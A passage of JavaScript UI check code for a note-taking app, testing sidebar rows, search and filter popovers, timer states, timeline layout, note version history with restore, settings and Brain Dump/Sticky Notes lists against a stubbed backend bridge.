      M.side[key] = { rows: rows.length, h: hs.join('/'), countEnd: ends.join('/'), headL: [...new Set(heads)].join('/'), labelL: [...new Set(labels)].join('/') };
      if (hs.join() !== '32') bad('sidebar rows 32px', `${key}: ${hs}`);
      if (ends.length > 1) bad('sidebar counts end on one edge', `${key}: ${ends}`);
      if (new Set([...heads, ...labels]).size > 1) bad('group names on the rows\' text line', `${key}: heads ${[...new Set(heads)]} rows ${[...new Set(labels)]}`);
      side.querySelectorAll('.bm-group').forEach(g => { const cs = getComputedStyle(g); if (cs.borderTopWidth !== '0px' || !/rgba\(0, 0, 0, 0\)|transparent/.test(cs.backgroundColor)) bad('flat groups have no box', key); });
      weightsOk('#left-sidebar .bm-row', key);
      [...side.querySelectorAll('.bm-row-label, .bm-group-title')].forEach(el => { if (el.scrollWidth > el.clientWidth + 1 && !el.closest('[data-tip], [title]')) bad('a sidebar label cut with no tooltip', `${key}: ${el.textContent}`); });
      if (!side.querySelector('.bm-foot') !== (view === 'history')) bad('the progress or week line pinned at the bottom', key);
      else if (view !== 'history' && Math.abs(px(side.querySelector('.bm-foot')).b - px(side).b) > .5) bad('the foot sits at the sidebar bottom', key);
    }
  }
  set({ screen: '1920x1080', font: 'opendyslexic', view: 'tasks', sample: 'typical' });

  // 3 · R46: search this module only (some / none with "No … match" and one Clear / cleared), the filter popover at its button with a
  //     badge, a click away and Esc close it, and Add project catches an empty or repeated name
  for (const sc of SC) for (const view of ['tasks', 'timer', 'history']) {
    set({ screen: sc, view, sample: 'typical', tpage: view === 'timer' ? 'history' : 'session', modal: null }); S.bm.pop = null; renderAll();
    const key = `${sc}/${view}`, sel = BM_MOD[view].rows, all = () => [...app.querySelectorAll('.view ' + sel)].filter(r => !r.closest('.bm-hist')), vis = () => all().filter(shown);
    const total = all().length, word = (all()[0]?.querySelector('.tp-title, .session-name, .feed-title')?.textContent || 'a').trim().split(/\s+/)[0].toLowerCase();
    const q = app.querySelector('#bm-q'); type(q, word); const some = vis().length;
    type(app.querySelector('#bm-q'), 'zzqxj'); const none = vis().length, msg = app.querySelector('.bm-nomatch')?.textContent || '';
    app.querySelector('.bm-nomatch [data-act="bm-clear"]')?.click(); await tick(); const back = vis().length;
    M.flows[`search ${key}`] = `${total} rows · "${word}" ${some} · none ${none} "${msg.trim().slice(0, 40)}" · cleared ${back}`;
    if (!total || !(some > 0 && some <= total) || none !== 0 || !new RegExp(`No ${BM_MOD[view].noun} match`).test(msg) || back !== total || S.bm.q[view]) bad('module search: some, none ("No … match"), cleared', M.flows[`search ${key}`]);
    if (view === 'tasks' && [...app.querySelectorAll('#left-sidebar .bm-row')].length !== [...app.querySelectorAll('#left-sidebar .bm-row')].filter(shown).length) bad('the search only searches the module\'s page', key);
    app.querySelector('[data-act="bm-filter"]').click(); await tick();
    const pop = app.querySelector('.bm-pop--filter'), btn = app.querySelector('[data-act="bm-filter"]');
    if (!pop) { bad('filter popover opens', key); continue; }
    const dy = half(px(pop).t - px(btn).b), inSide = px(pop).l >= px(app.querySelector('#left-sidebar')).l - .5 && px(pop).r <= px(app.querySelector('#left-sidebar')).r + .5;
    const x = pop.querySelector('.bm-pop-head [data-act="bm-close"]'), chips = [...pop.querySelectorAll('.bm-chip')].filter(shown);
    M.flows[`filter ${key}`] = `under its button +${dy}px · in the sidebar ${inSide} · × ${!!x} · ${chips.length} choices · chips ${[...new Set(chips.map(c => half(px(c).h)))]}px`;
    if (dy < -6 || dy > 8 || !inSide || !x || [...new Set(chips.map(c => half(px(c).h)))].join() !== '24') bad('filter popover at its button, × on the title line, 24px chips', M.flows[`filter ${key}`]);
    weightsOk('.bm-pop .bm-chip', key);
    const pick = chips.find(c => c.getAttribute('aria-pressed') === 'false' && !/^(All|Any)$/.test(c.dataset.v)); pick.click(); await tick();
    const badge = app.querySelector('[data-act="bm-filter"] .bm-badge')?.textContent, stillOpen = !!app.querySelector('.bm-pop--filter'), count = app.querySelector('.bm-shown')?.textContent || '';
    app.querySelector('.view').dispatchEvent(new MouseEvent('click', { bubbles: true })); await tick(); const away = !app.querySelector('.bm-pop');
    app.querySelector('[data-act="bm-filter"]').click(); await tick(); document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); await tick();
    const esc = !app.querySelector('.bm-pop') && document.activeElement === app.querySelector('[data-act="bm-filter"]');
    M.flows[`filter ${key}`] += ` · picked "${pick.textContent}" badge ${badge} "${count}" · click away ${away} · Esc ${esc}`;
    if (badge !== '1' || !stillOpen || !/\d+ of \d+/.test(count) || !away || !esc) bad('filter: a badge counts it, click away and Esc close', M.flows[`filter ${key}`]);
    bmClear(); await tick(); if (bmFilterCount() || app.querySelector('.bm-badge')) bad('Clear filters and search clears the badge', key);
  }
  { set({ screen: '1366x768', view: 'timer', tpage: 'session' }); const q = app.querySelector('#bm-q'); q.focus(); type(q, 'a'); await tick();
    M.flows.timerSearch = `typing on Session → ${UI.tpage} · focus kept ${document.activeElement?.id}`; if (UI.tpage !== 'history' || document.activeElement?.id !== 'bm-q') bad('Timer search shows History and keeps the caret', M.flows.timerSearch); bmClear(); }
  { set({ view: 'tasks' }); const n0 = D.projects.length; app.querySelector('[data-act="bm-proj"]').click(); await tick();
    const pop = app.querySelector('.bm-pop--proj'), focus = document.activeElement?.id;
    app.querySelector('[data-act="bm-proj-add"]').click(); await tick(); const e1 = S.bm.projErr;
    type(app.querySelector('#bm-proj-name'), D.projects[0].name); app.querySelector('[data-act="bm-proj-add"]').click(); await tick(); const e2 = S.bm.projErr;
    type(app.querySelector('#bm-proj-name'), 'Interview prep (Build M check)'); app.querySelector('#bm-proj-name').dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); await tick();
    M.flows.addProject = `opens ${!!pop} focus ${focus} · empty "${e1}" · repeated "${e2}" · Enter adds ${D.projects.length - n0}, closed ${!S.bm.pop}`;
    if (!pop || focus !== 'bm-proj-name' || !/Type a name/.test(e1) || !/already exists/.test(e2) || D.projects.length !== n0 + 1 || S.bm.pop) bad('Add project popover', M.flows.addProject);
    D.projects.pop(); }

  // 4 · The Timer: just the timer (no number tiles, no head chip), the card's rows, Stop & log still, and Today folded to one line
  for (const sc of SC) for (const font of ['opendyslexic', 'system']) {
    const heads = {}, stop = {}, key0 = `${sc}/${font}`;
    for (const tstate of ['idle', 'running', 'stopwatch', 'checkin', 'pausepick', 'paused', 'overtime', 'rate']) {
      set({ screen: sc, font, view: 'timer', tpage: 'session', tstate, sample: 'typical' }); const key = `${key0}/${tstate}`, card = app.querySelector('#timer-card'); measure(`buildM timer ${key}`);
      if (app.querySelector('.view .kpi-row') || app.querySelector('.view-head .chip')) bad('Timer: no number tiles or head chip', key);
      heads[tstate] = half(px(card.querySelector('.bm-card-head')).h);
      const off = [...card.querySelectorAll('button:not(.seg-opt), select, input:not([type="checkbox"]), .seg')].filter(shown).map(b => half(px(b).h)).filter(h => ![24, 28, 32, 36].includes(h)); if (off.length) bad('Timer controls on the 24/28/32/36 scale', `${key}: ${off}`);
      card.querySelectorAll('.bm-trow').forEach(r => { const cs = [...r.querySelectorAll('.seg, select, .btn')].filter(shown).map(c => half(px(c).h)); if (new Set(cs.filter(h => h >= 28)).size > 1) bad('one control height in a row', `${key}: ${cs}`); });
      const s = card.querySelector('[data-act="tstop"]'); if (s) stop[tstate] = half(px(s).l);
      if (tstate === 'pausepick' && !card.querySelector('[data-act="tpause"]')?.disabled) bad('Pause greys out while the reason is picked', key);
      weightsOk('#timer-card .seg-opt', key);
    }
    M.timer[key0] = { heads: [...new Set(Object.values(heads))].join('/'), stop: [...new Set(Object.values(stop))].join('/') };
    if (new Set(Object.values(heads)).size > 1) bad('Timer card heads one height', `${key0}: ${JSON.stringify(heads)}`);
    if (new Set(Object.values(stop)).size > 1) bad('Stop & log stays put', `${key0}: ${JSON.stringify(stop)}`);
    set({ tstate: 'running' }); const today = app.querySelector('.bm-today'), th = half(px(today).h), hh = half(px(today.querySelector('.bm-card-head')).h);
    M.timer[key0].today = `folded ${th}px (head ${hh}px)`; if (!today.classList.contains('is-folded') || Math.abs(th - hh - 2) > 1 || today.querySelector('.session-list')) bad('Today folds to one line', `${key0}: ${M.timer[key0].today}`);
    const sb = app.querySelector('.view').scrollTop; today.querySelector('[data-act="bm-today"]').click(); await tick(); const open = app.querySelector('.bm-today');
    if (!open.querySelector('.session-list, .bm-none') || document.activeElement !== open.querySelector('[data-act="bm-today"]') || open.querySelector('[data-act="bm-today"]').getAttribute('aria-expanded') !== 'true') bad('Show unfolds Today and keeps focus', key0);
    if (Math.abs(app.querySelector('.view').scrollTop - sb) > 1) bad('Show keeps the scroll', key0);
    S.bm.todayOpen = false;
    for (const tpage of ['insights', 'history', 'projects']) { set({ tpage }); measure(`buildM timer ${key0}/${tpage}`); if (!app.querySelector('.view.bm-tview')) bad('Timer pages keep the card heads', `${key0}/${tpage}`); }
    set({ tpage: 'session' });
  }

  // 5 · The Timeline: milestones as rows (no box in a box), activity by day with fixed columns, 28px secondary actions, no head chip
  for (const sc of SC) for (const font of ['opendyslexic', 'system']) for (const [range, type0] of [['All', 'All'], ['Today', 'All'], ['All', 'Created']]) {
    S.range = range; S.type = type0; set({ screen: sc, font, view: 'history', sample: 'typical' }); const key = `${sc}/${font}/${range}/${type0}`; measure(`buildM timeline ${key}`);
    if (app.querySelector('.view-head .chip') || app.querySelector('.milestone, .milestones')) bad('Timeline: no head chip, milestones not boxes', key);
    app.querySelectorAll('.tl-mrow').forEach(r => { const cs = getComputedStyle(r); if (cs.borderLeftWidth !== '0px' || cs.borderRadius !== '0px') bad('milestone rows are rows, not boxes', key); });
    const items = [...app.querySelectorAll('.tl-feed .feed-item')], times = [...new Set(items.map(i => half(px(i.querySelector('.feed-time')).l)))], whats = [...new Set(items.map(i => half(px(i.querySelector('.tl-what')).l)))];
    const acts = items.map(i => i.querySelector(':scope > .btn')).filter(Boolean), actR = [...new Set(acts.map(b => half(px(b).r)))], actH = [...new Set(acts.map(b => half(px(b).h)))];
    const days = [...app.querySelectorAll('.tl-feed .day-head .list-item-title')].map(d => d.textContent);
    M.tl[key] = { items: items.length, days: days.join(' · '), timeL: times.join('/'), whatL: whats.join('/'), actR: actR.join('/'), actH: actH.join('/') };
    if (times.length > 1 || whats.length > 1 || actR.length > 1 || (acts.length && actH.join() !== '28')) bad('Timeline columns line up, 28px actions', `${key}: ${JSON.stringify(M.tl[key])}`);
    if (new Set(days).size !== days.length) bad('activity grouped by day', `${key}: ${days}`);
    if (acts.some(b => !b.classList.contains('btn--secondary'))) bad('Go back and Open note are secondary buttons', key);
  }
  S.range = 'All'; S.type = 'All';

  // 6 · Note history: the card on top, versions left and changes right in the text (added marked, removed struck), Restore at once
  //     keeping the replaced version; ⋮ → Version history… opens it; it stacks when the card is narrow
  for (const sc of SC) for (const font of ['opendyslexic', 'system']) {
    set({ screen: sc, font, view: 'notes', sample: 'typical' }); S.bm.sv = {}; S.noteId = 'note-1'; renderAll();
    S.menu = true; renderAll(); app.querySelector('.app-header .menu [data-act="history"]').click(); await tick();
    const key = `${sc}/${font}`, card = app.querySelector('.bm-hist'), first = app.querySelector('.view-inner > .card');
    measure(`buildM history ${key}`);
    if (UI.view !== 'history' || !card || first !== card || card.dataset.note !== 'note-1') { bad('⋮ → Version history… opens the note\'s history on top of the Timeline', `${key}: view ${UI.view}, card ${!!card}, first ${first?.getAttribute('aria-label')}`); continue; }
    const rows = [...card.querySelectorAll('.bm-versions .bm-row')], cur = card.querySelector('.bm-versions .bm-row[aria-current="true"]'), restore = card.querySelector('[data-act="bm-restore"]');
    const grid = getComputedStyle(card.querySelector('.bm-hist-grid')).gridTemplateColumns.split(' ').length, ins = card.querySelectorAll('.bm-diff ins').length, del = card.querySelectorAll('.bm-diff del').length;
    const insCs = card.querySelector('.bm-diff p ins') && getComputedStyle(card.querySelector('.bm-diff p ins')), delCs = card.querySelector('.bm-diff p del') && getComputedStyle(card.querySelector('.bm-diff p del'));
    M.hist[key] = { versions: rows.length, rowH: [...new Set(rows.map(r => half(px(r).h)))].join('/'), picked: rows.indexOf(cur), restoreH: half(px(restore).h), columns: grid, ins, del, ends: [...new Set(rows.map(r => half(px(r.querySelector('.bm-row-count')).r)))].join('/') };
    if (rows.length !== 5 || M.hist[key].rowH !== '32' || rows.indexOf(cur) !== 1 || M.hist[key].restoreH !== 32 || !restore.classList.contains('btn--primary') || M.hist[key].ends.includes('/')) bad('versions are 32px rows, the one before picked, Restore 32px primary', `${key}: ${JSON.stringify(M.hist[key])}`);
    if (grid !== 2) bad('versions left, changes right', `${key}: ${grid} columns`);
    if (!ins || (insCs && !/underline/.test(insCs.textDecorationLine)) || (delCs && !/line-through/.test(delCs.textDecorationLine))) bad('changes in the text: added underlined, removed struck', `${key}: ins ${ins} del ${del}`);
    weightsOk('.bm-versions .bm-row', key);
    rows[3].click(); await tick(); const c2 = app.querySelector('.bm-hist'), del3 = c2.querySelectorAll('.bm-diff del').length, sub = c2.querySelector('.bm-hist-sub').textContent;
    if (!del3 || !/Changes since/.test(sub) || document.activeElement?.dataset.act !== 'bm-ver') bad('picking an older version shows what changed since, focus kept', `${key}: del ${del3} "${sub}"`);
    rows[0] && app.querySelector('.bm-versions .bm-row').click(); await tick();
    if (app.querySelector('[data-act="bm-restore"]').getAttribute('aria-disabled') !== 'true' || !app.querySelector('[data-act="bm-restore"]').title) bad('Restore is disabled with the reason on the current version', key);
    app.querySelectorAll('.bm-versions .bm-row')[2].click(); await tick();
    const n = D.notes.find(x => x.id === 'note-1'), before = n.md, old = S.bm.sv['note-1'][2].content, ev0 = D.events.length;
    app.querySelector('[data-act="bm-restore"]').click(); await tick();
    // round 6 (r42-restore "Ask first"): the question comes first, nothing restored yet; Cancel goes back to Restore; then Restore
    { const d = app.querySelector('[data-dlg="bm-restore"]'), fb = document.activeElement?.dataset.dlgBtn, ok = n.md === before;
      M.hist[key].ask = `${d ? `"${d.querySelector('.modal-title').textContent}"` : 'no question'} · focus ${fb} · text kept ${ok}`;
      if (!d || fb !== 'main' || !ok) bad('Restore asks first', `${key}: ${M.hist[key].ask}`);
      d?.querySelector('[data-act="close"]:not(.modal-x)')?.click(); await tick();
      if (S.modal || n.md !== before || !document.activeElement?.matches('[data-act="bm-restore"]')) bad('Cancel keeps the note, back on Restore', `${key}: ${S.modal} ${document.activeElement?.dataset.act}`);
      app.querySelector('[data-act="bm-restore"]').click(); await tick(); app.querySelector('[data-act="bm-restore-ok"]').click(); await tick(); }
    const V = bmSampleVers(n), reasons = V.map(v => v.reason).slice(0, 3).join(' ');
    M.hist[key].restore = `${reasons} · text ${n.md === old ? 'restored' : 'NOT restored'} · replaced kept ${V[1].content === before} · event ${D.events.length - ev0} · "${S.status.slice(0, 60)}"`;
    if (n.md !== old || reasons !== 'restore before-restore save' || V[1].content !== before || D.events.length !== ev0 + 1 || !/version it replaced is kept/.test(S.status) || S.modal) bad('Restore (after the question) keeps the replaced version', `${key}: ${M.hist[key].restore}`);
    // the note menu in the head picks another note
    const selN = app.querySelector('[data-bm-hist-note]'); selN.value = 'note-2'; selN.dispatchEvent(new Event('change', { bubbles: true })); await tick();
    if (app.querySelector('.bm-hist')?.dataset.note !== 'note-2' || document.activeElement !== app.querySelector('[data-bm-hist-note]')) bad('the note menu picks another note', key);
  }
  // a split pane: the card is narrower than 700px, so the versions stack above the changes
  { set({ screen: '1366x768', view: 'notes', sample: 'typical' }); S.bm.hist = { noteId: 'note-1', ver: null }; pnDock('history', 'beside'); await tick();   // Build M · R44: the Timeline docked beside the note
    const card = app.querySelector('.pane .bm-hist'), g = card && getComputedStyle(card.querySelector('.bm-hist-grid')).gridTemplateColumns.split(' ').length;
    M.hist.split = `card ${card ? half(px(card).w) : '-'}px · ${g} column(s)`; if (!card || (px(card).w < 700 && g !== 1)) bad('note history stacks in a narrow pane', M.hist.split);
    app.querySelectorAll('.pane .view').forEach(p => { if (p.scrollWidth > p.clientWidth + 1) bad('pane scrolls sideways', 'history split'); }); pnReset(); setUI('view', 'notes'); }
  // Ctrl+K → Version history opens it too
  { set({ view: 'notes', sample: 'typical' }); S.noteId = 'note-2'; renderAll(); openPalette(); S.pal.q = '>version'; renderAll(); const i = S.pal.flat.findIndex(x => /Version history/.test(x.label)); runPalette(i); await tick();
    if (UI.view !== 'history' || app.querySelector('.bm-hist')?.dataset.note !== 'note-2' || S.modal) bad('Ctrl+K → Version history opens the note\'s history', `${UI.view} ${app.querySelector('.bm-hist')?.dataset.note}`); }
  // a real vault: the calls go to the backend (list, compare, restore) and the note takes the restored text
  { set({ screen: '1920x1080', view: 'notes', sample: 'typical' }); const n = D.notes[0]; n.mtime = '2026-10-17T10:00:00+00:00'; S.bm.hv = {}; S.bm.hd = {}; VAULT.live = true;
    const vers = [{ id: 30, saved_at: '2026-10-17T10:00:00+00:00', words: 9, delta_words: 3, reason: 'save' }, { id: 20, saved_at: '2026-10-17T09:00:00+00:00', words: 6, delta_words: null, reason: 'save' }];
    let calls = [];
    try {
      calls = await withApi({ list_versions: () => vers, compare_versions: () => ({ status: 'success', changed: true, added: 3, removed: 0, paras: [{ kind: 'edit', ops: [['eq', 'One'], ['add', 'two three four']] }] }),
        restore_version: () => ({ status: 'success', content: 'One', updated_at: '2026-10-17T10:05:00+00:00', version_id: 31 }), list_recent_versions: () => [], save_task: () => ({ status: 'success' }) }, async () => {
        bmOpenHistory(n.id); for (let i = 0; i < 12 && !app.querySelector('.bm-diff ins'); i++) await tick(6);
        M.flows.live = `diff "${app.querySelector('.bm-diff')?.textContent.trim().slice(0, 30)}"`;
        app.querySelector('[data-act="bm-restore"]')?.click(); await tick(); app.querySelector('[data-act="bm-restore-ok"]')?.click(); for (let i = 0; i < 12 && n.md !== 'One'; i++) await tick(6); });
    } finally { VAULT.live = false; S.bm.hv = {}; S.bm.hd = {}; }
    const names = calls.map(c => c[0]), rv = calls.find(c => c[0] === 'restore_version');
    M.flows.live += ` · calls ${[...new Set(names)].join(', ')} · restore(${rv?.[1].join(', ')}) · note "${n.md}"`;
    if (!names.includes('list_versions') || !names.includes('compare_versions') || !rv || rv[1][1] !== '20' || n.md !== 'One' || n.mtime !== '2026-10-17T10:05:00+00:00') bad('a real vault: list, compare and restore through the backend', M.flows.live); }

  // 7 · Settings → Vault & files: Versions kept is a real setting now (3, 5 or 10), not Coming soon
  { set({ view: 'notes', modal: 'settings' }); S.setSec = 'vault'; renderAll(); const row = [...app.querySelectorAll('.set-row')].find(r => /Versions kept/.test(r.textContent));
    const opts = row ? [...row.querySelectorAll('[data-act="bm-kept"]')] : [], soonLeft = /File history|Coming soon/.test(row?.textContent || '') || row?.querySelector('[data-soon]');
    const was = S.a11y.history; let now, saved;   // a stand-in bridge: the check never writes config.json (or prunes a database)
    const calls = await withApi({ save_settings: p => ({ status: 'success', ...p }) }, async () => { opts.find(o => o.dataset.v === '3')?.click(); await tick(); now = S.a11y.history; S.a11y.history = was; });
    saved = calls.find(c => c[0] === 'save_settings')?.[1][0];
    M.flows.settings = `row ${!!row} · ${opts.map(o => o.textContent).join('/')} · picked 3 → ${now} · saves ${JSON.stringify(saved)}`;
    if (!row || opts.map(o => o.dataset.v).join() !== '3,5,10' || soonLeft || now !== 3 || saved?.note_versions_kept !== 3) bad('Settings → Vault & files → Versions kept', M.flows.settings);
    set({ modal: null }); S.setSec = 'appearance'; }
  set({ screen: '1920x1080', font: 'opendyslexic', view: 'notes', sample: 'typical', modal: null, tstate: 'running' }); S.bm.sv = {}; S.bm.hist = { noteId: null, ver: null };
}
/* ==== end Build M ==== */
/* ==== Build O (mockup R47 / R47b): the names, the Brain Dump and Sticky Notes lists, files dropped in, the drop question,
   converting (the pill and its Cancel, the result, the Attachments tab), a scan, the Settings card. A stand-in bridge answers
   the backend's calls (the check never writes a file or the database). Runs in the full sweep, or alone with ?check=1&only=buildo ==== */
async function checkBuildO() {
  const O = out.numbers.buildO = { names: {}, lists: {}, drop: {}, flows: {} }, bad = (k, v) => iss('Build O ' + k, v), tick = (ms = 0) => new Promise(r => setTimeout(r, ms));
  const withApi = async (fake, fn) => { const was = window.pywebview, calls = [];
    window.pywebview = { api: new Proxy({}, { get: (_, n) => typeof n !== 'string' || n === 'then' ? undefined : (...a) => { calls.push([n, a]); return Promise.resolve(fake[n] ? fake[n](...a) : { status: 'success' }); } }) };
    try { await fn(calls); } finally { window.pywebview = was; } return calls; };
  const fileNames = key => { const hits = [], walk = document.createTreeWalker(app, NodeFilter.SHOW_TEXT); let n;
    while ((n = walk.nextNode())) { const p = n.parentElement; if (!p || p.closest('.code, textarea, .doc, [contenteditable="true"]') || !p.getClientRects().length) continue; if (/_inbox\.md|stickynoted/.test(n.nodeValue)) hits.push(n.nodeValue.trim().slice(0, 50)); }
    app.querySelectorAll('[data-tip], [title], [aria-label], [placeholder]').forEach(el => ['title', 'aria-label', 'placeholder'].forEach(a => { const v = el.getAttribute(a); if (v && /_inbox\.md|stickynoted/.test(v)) hits.push(`${a} "${v.slice(0, 50)}"`); }));
    if (hits.length) bad('a file name where a name belongs (QC 20)', `${key}: ${[...new Set(hits)].slice(0, 3).join(' | ')}`); };
  const fresh = () => { LD.list = null; LD.menu = null; LD.pop = null; LD.q = { inbox: '', stickies: '' }; LD.f = { inbox: 'All', stickies: 'All' }; LD.done = []; LD.add = '';
    DROPO.ask = null; DROPO.scan = null; DROPO.job = null; DROPO.result = null; DROPO.drag = null; DROPO.def = 'ask'; DROPO.undo = null; if (HOLD.cur) { clearTimeout(HOLD.cur.t); HOLD.cur = null; } S.toast = null; };
  const drag = (names, types, x, y, kind) => { const dt = new DataTransfer(); names.forEach((n, i) => dt.items.add(new File(['x'], n, { type: types[i] }))); (document.elementFromPoint(x, y) || app).dispatchEvent(new DragEvent(kind, { bubbles: true, cancelable: true, clientX: x, clientY: y, dataTransfer: dt })); };

  const cap0 = CAPTURE.live; CAPTURE.live = false;   // the sample's stickies and thoughts: nothing goes to the backend
  // 1 · names: the sidebar rows, their tooltips, the lists, Settings → Vault & files
  set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null }); fresh(); renderAll();
  O.names.rows = [...app.querySelectorAll('.tree-sys [data-tree]')].map(r => r.querySelector('.tree-name').textContent).join(', ');
  if (O.names.rows !== 'Brain Dump, Sticky Notes') bad('sidebar rows read as names', O.names.rows);
  fileNames('sidebar'); S.setSec = 'vault'; set({ modal: 'settings' }); fileNames('Settings → Vault & files'); set({ modal: null });

  // 2 · the lists: a click on the row shows the list in the main pane, never the capture bar; on four screens
  for (const sc of ['1920x1080', '1366x768', 'portrait1080', '3440x1440']) for (const k of ['inbox', 'stickies']) for (const sample of ['typical', 'stress', 'empty']) {
    set({ screen: sc, sample, view: 'notes', modal: null }); fresh();
    const row = app.querySelector(`.tree-sys [data-tree="${k}"]`); if (row) row.click(); else treeActivate(k, k); await tick();   // no project yet: Build C hides the rows
    const pg = app.querySelector(`.ld-page[data-ld-page="${k}"]`), rows = [...app.querySelectorAll('[data-ld-item]')], key = `${sc}/${sample}/${k}`;
    const want = k === 'inbox' ? ldThoughts().length : D.stickies.length, hdr = app.querySelector('.main > .app-header');
    if (!pg || S.modal === 'dump' || app.querySelector('.dump')) bad('the row opens its list, not the capture bar', key);
    if (rows.length !== want) bad('every item listed', `${key}: ${rows.length} of ${want}`);
    if (hdr && hdr.offsetParent) bad('the note header hides while a list shows', key);
    if (!want && !app.querySelector('.ld-empty')) bad('an empty list says so', key);
    rows.forEach(r => { if (r.offsetHeight < 43.5) bad('item rows at least 44px', `${key}: ${r.offsetHeight}`); const m = r.querySelector('.ld-more svg'); if (!m || m.querySelectorAll('circle').length !== 3) bad('one ⋮ (filled dots)', key); });
    const tools = app.querySelector('.ld-tools'); if (!tools || ![...tools.children].map(c => c.dataset.act || (c.matches('.field-search') ? 'search' : '')).join(',').startsWith('ld-filter,ld-new,search')) bad('R46 tools row: filter, add, search', key);
    measure('buildO ' + key); fileNames(key);
    O.lists[key] = `${rows.length} rows${rows[0] ? ' · ' + half(rows[0].offsetHeight) + 'px' : ''}`;
  }
  // search, the filter, Esc; ⋮ under its button; a click away; delete with Undo; tick; add
  { set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null }); fresh(); const n0 = S.noteId;
    app.querySelector('.tree-sys [data-tree="inbox"]').click(); await tick();
    const q = app.querySelector('#ld-q'), first = ldThoughts()[0]; q.value = first.text.slice(0, 6).toLowerCase(); q.dispatchEvent(new Event('input', { bubbles: true }));
    const shown = app.querySelectorAll('[data-ld-item]:not([hidden])').length; q.value = 'zzqq'; q.dispatchEvent(new Event('input', { bubbles: true }));
    const none = app.querySelector('.ld-none')?.textContent.trim();
    q.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); const cleared = LD.q.inbox === '' && LD.list === 'inbox';
    app.querySelector('[data-act="ld-menu"]').click(); await tick(); const m = app.querySelector('.ld-menu'), mb = app.querySelector('[data-act="ld-menu"][aria-expanded="true"]');
    const under = m && mb ? Math.round(px(m).t - px(mb).b) : null, inside = m && px(m).l >= 7.5 && px(m).r <= app.offsetWidth - 7.5;
    const items = m ? [...m.querySelectorAll('.menu-item')].map(x => x.textContent.trim()) : [];
    app.querySelector('.ld-sub').click(); await tick(); const away = !app.querySelector('.ld-menu') && !LD.menu;
    app.querySelector('[data-act="ld-filter"]').click(); await tick(); app.querySelector('.ld-filter [data-act="ld-f"][data-v="Done"]')?.click(); await tick();
    const doneOnly = [...app.querySelectorAll('[data-ld-item]')].every(r => r.classList.contains('is-done')), badge = !!app.querySelector('[data-act="ld-filter"] .bm-badge');
    LD.f.inbox = 'All'; LD.pop = null; renderAll();
    const before = ldThoughts().length; LD.menu = 'in:' + first.id; renderAll(); app.querySelector('.ld-menu [data-act="ld-del"]').click(); await tick();
    const gone = ldThoughts().length === before - 1 && !!HOLD.cur; holdUndo(); const back = ldThoughts().length === before;
    const cb = app.querySelector(`[data-ld-done="${first.id}"]`); cb.checked = true; cb.dispatchEvent(new Event('change', { bubbles: true })); await tick(); await tick();
    const ticked = first.done === true && !D.inbox.includes(first) && LD.done.includes(first) && !!app.querySelector(`[data-ld-item="in:${first.id}"].is-done`);
    cb.checked = false; app.querySelector(`[data-ld-done="${first.id}"]`).checked = false; app.querySelector(`[data-ld-done="${first.id}"]`).dispatchEvent(new Event('change', { bubbles: true })); await tick(); await tick();
    const add = app.querySelector('#ld-add'); add.value = 'A thought from the check'; add.dispatchEvent(new KeyboardEvent('keydown', { key: 'Enter', bubbles: true })); await tick(); await tick();
    const added = D.inbox.some(x => x.text === 'A thought from the check') && S.modal !== 'dump'; D.inbox = D.inbox.filter(x => x.text !== 'A thought from the check');
    document.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape', bubbles: true })); const closed = !LD.list && S.noteId === n0 && !!app.querySelector('#note-body-editor');
    O.flows.list = `search ${shown} · "${none}" · Esc clears ${cleared} · ⋮ ${under}px under, inside ${inside}, [${items.join(' / ')}] · away ${away} · Done only ${doneOnly}, badge ${badge} · delete ${gone}, undo ${back} · tick ${ticked} · add ${added} · Esc closes ${closed}`;
    if (!shown || !/Nothing in Brain Dump matches/.test(none || '') || !cleared || under !== 6 || !inside || items.join('|') !== `Move to “${note().title}”|Move to a new note|Make it a task|Mark done|Delete` || !away || !doneOnly || !badge || !gone || !back || !ticked || !added || !closed) bad('the Brain Dump list: search, filter, ⋮, delete, tick, add, Esc', O.flows.list);
    first.done = false; if (!D.inbox.includes(first)) D.inbox.push(first); LD.done = []; }
  { set({ view: 'notes', sample: 'typical', modal: null }); fresh(); app.querySelector('.tree-sys [data-tree="stickies"]').click(); await tick();
    const s = D.stickies[0]; LD.menu = 'st:' + s.id; renderAll(); const items = [...app.querySelectorAll('.ld-menu .menu-item')].map(x => x.textContent.trim());
    LD.menu = null; app.querySelector(`[data-act="ld-open"][data-v="${s.id}"]`).click(); await tick(); const shown = s.open === true && !!app.querySelector(`[data-widget="st:${s.id}"]`);
    O.flows.stickies = `[${items.join(' / ')}] · Show/Reopen ${shown}`; if (items.join('|') !== 'Pop out, on top of other apps|Make it a note|Make it a task|Delete' || !shown) bad('the Sticky Notes list', O.flows.stickies);
    s.open = false; LD.list = null; renderAll(); }

  // 3 · dropping files, with a stand-in bridge (VAULT.live: the real-data paths)
  const att = (file, size = 2400) => ({ status: 'success', file, name: file.split('/').pop(), kind: attKind(file), size, mtime: '2026-10-17T10:00:00' });
  const liveWas = VAULT.live, capWas = CAPTURE.live, live = () => { VAULT.live = true; CAPTURE.live = true; };   // set({ sample }) puts the sample back, not live
  try {
    // an image over the note: the overlay, the line, then it goes in after the block under the pointer
    { set({ screen: '1920x1080', sample: 'typical', view: 'notes', modal: null }); fresh(); live(); const n = note(), md0 = n.md;
      const calls = await withApi({ drop_paths: names => Object.fromEntries(names.map(x => [x, 'C:/drop/' + x])), drop_import: p => att('attachments/' + p.split('/').pop()) }, async () => {
        const bs = doBlocks(app.querySelector('#note-body-editor')), r = bs[1].getBoundingClientRect(), y = r.bottom - 2, bs1 = bs[1].textContent;
        drag(['sketch.png'], ['image/png'], r.left + 20, y, 'dragover');
        const ov = app.querySelector('.do-drop')?.textContent, line = app.querySelector('.do-drop-line'), lr = line && px(line), at = DROPO.at;
        O.drop.image = `overlay "${ov}" · line ${lr ? half(lr.t) : '-'} (block 1 ends ${half(px(bs[1]).b)}) · at ${at}`;
        if (!/Drop to put the image here/.test(ov || '') || !line || at !== 1 || Math.abs(lr.t - px(bs[1]).b - 4) > 1.5) bad('the overlay and the line while an image is dragged', O.drop.image);
        drag(['sketch.png'], ['image/png'], r.left + 20, y, 'drop'); for (let i = 0; i < 20 && !HOLD.cur; i++) await tick(5);
